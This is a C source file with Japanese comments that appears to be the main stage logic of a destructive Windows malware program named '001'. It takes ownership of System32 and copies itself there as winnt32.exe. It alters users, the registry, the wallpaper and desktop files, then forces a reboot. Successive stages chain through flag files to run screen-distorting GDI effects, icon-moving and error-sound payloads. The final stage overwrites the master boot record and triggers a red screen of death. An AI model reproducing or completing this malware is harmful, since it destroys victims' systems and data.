#include "001.h"

void All_Setup ( )
{
	//実行ファイルパス
	WCHAR ExePath[ MAX_PATH ];
	GetModuleFileNameW ( NULL, ExePath, sizeof ( ExePath ) / sizeof ( *ExePath ) );

	//ファイルの所有者権限取得
	TakeOwn ( L"C:\\Windows\\System32" );

	//System32に自身の複製を作成
	_001_CopyFile ( ExePath, L"C:\\Windows\\System32\\winnt32.exe", FALSE );

	//セットアップ
	_001_StartSetup ( );
	_001_UsersSetup ( );
	_001_registrySetup ( );
	_001_WallpaperSetup ( );
	_001_DesktopFilesSetup ( );

	//実行フラグ作成
	CreateFlag ( L"001Flag.tmp" );
	Sleep ( 3000 );
}

void payload_start1 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//フラグ作成
	CreateFlag ( L"001Flags2" );

	WCHAR text[ MAX_PATH ];
	GetRandomPath ( text, 30 );
	MessageBoxW ( NULL, text, NULL, MB_OK | MB_ICONWARNING );
	Poweroff ( ShutdownReboot );
}

void payload_start2 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//前のフラグ削除
	DeleteFlag ( L"001Flags2" );

	//新しいフラグの作成
	CreateFlag ( L"001Flags3" );

	//Sleep( 3000 );

	//ペイロード実行
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_MoveIconsPayload, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start3 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//前のフラグ削除
	DeleteFlag ( L"001Flags3" );

	//新しいフラグの作成
	CreateFlag ( L"001Flags4" );

	//Sleep( 3000 );

	//ペイロード実行
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi1, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start4 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//前のフラグ削除
	DeleteFlag ( L"001Flags4" );

	//新しいフラグの作成
	CreateFlag ( L"001Flags5" );

	//Sleep( 3000 );

	//ペイロード実行
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ApplicationError, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start5 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//前のフラグ削除
	DeleteFlag ( L"001Flags5" );

	//新しいフラグの作成
	CreateFlag ( L"001Flags6" );

	//Sleep( 3000 );

	//ペイロード実行
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ErrorSound1, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi2, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start6 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//前のフラグ削除
	DeleteFlag ( L"001Flags6" );

	//新しいフラグの作成
	CreateFlag ( L"001Flags7" );

	//Sleep( 3000 );

	//ペイロード実行
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ErrorSound2, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi3, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start7 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//前のフラグ削除
	DeleteFlag ( L"001Flags7" );

	//新しいフラグの作成
	CreateFlag ( L"001FlagsFINAL" );

	//Sleep( 3000 );

	//ペイロード実行
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ErrorSound2, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi4, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_startFINAL ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI設定
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//前のフラグ削除
	DeleteFlag ( L"001FlagsFINAL" );

	//Sleep( 3000 );

	//ペイロード実行
	_001_OverwriteMBR ( );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );
	_001_RSOD ( );

	Sleep ( INFINITE );
}